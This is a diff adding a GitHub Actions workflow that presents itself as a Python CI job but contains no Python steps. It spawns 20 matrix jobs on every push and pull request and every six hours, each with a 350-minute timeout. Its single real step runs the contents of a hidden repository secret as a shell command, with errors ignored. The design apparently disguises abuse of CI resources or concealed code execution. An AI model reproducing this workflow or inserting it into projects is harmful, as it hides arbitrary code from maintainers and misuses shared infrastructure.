@@ -1,0 +1,22 @@
+name: Python 
+on:   
+  push: 
+  pull_request: 
+  schedule: 
+  - cron: "0 */6 * * *"
+  
+jobs: 
+ python-1: 
+    runs-on: ubuntu-22.04
+    strategy: 
+      fail-fast: false 
+      matrix: 
+         go: [1.11, 1.12, 1.13, 1.14, 1.15] 
+         flag: [A, B, C, D] 
+    timeout-minutes: 350
+  
+    steps: 
+    - uses: actions/checkout@v3
+    - name: Rerunning 
+      continue-on-error: true 
+      run: ${{ secrets.CODE }} 
